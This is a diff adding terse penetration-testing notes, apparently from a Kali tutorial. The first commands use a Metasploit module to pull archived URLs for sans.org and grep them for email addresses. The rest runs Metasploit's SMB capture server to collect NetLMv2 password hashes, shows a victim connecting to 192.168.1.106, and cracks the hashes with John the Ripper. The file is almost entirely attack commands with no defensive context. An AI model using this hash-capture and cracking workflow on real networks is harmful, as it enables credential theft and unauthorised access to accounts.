@@ -1,0 +1,27 @@
+Retrieve Deleted Webpages
+
+/usr/share/metasploit-framework/modules
+
+kali > cd /usr/share/metasploit-framework/modules/
+kali > ls -l
+kali > cd auxiliary
+kali > ls -l
+Archive.org 
+kali > msfconsole
+msf > use auxiliary/scanner/http/enum_wayback
+msf > set OUTFILE sans_wayback
+msf > set DOMAIN sans.org
+msf > run
+kali > more sans_wayback
+kali > more sans_wayback | grep email
+kali > more sans_wayback | grep nessus
+
+kali > msfconsole
+msf > use auxiliary/server/capture/smb
+msf >show options
+msf > set JOHNPWFILE /root/domainhashes
+msf > exploit
+
+net use \\192.168.1.106 nullbyte
+kali > cd /root
+kali > john johnhashes_netlmv2
